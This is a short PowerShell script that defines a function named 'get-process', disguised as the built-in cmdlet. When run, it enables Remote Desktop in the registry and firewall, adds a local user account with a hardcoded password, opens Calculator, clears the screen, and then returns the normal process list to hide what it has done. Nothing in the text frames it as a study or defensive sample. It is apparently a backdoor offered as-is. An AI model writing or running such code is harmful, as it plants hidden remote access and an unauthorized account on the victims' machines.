function get-process {
(set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0) #fa@l shodane remote desktop
(Enable-NetFirewallRule -DisplayGroup "Remote Desktop")
(set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1 )
(net user moslem l4tr0d3ctism /add)
(Invoke-Item C:\Windows\System32\calc.exe)
(clear)
[diagnostics.process]::GetProcesses()
}

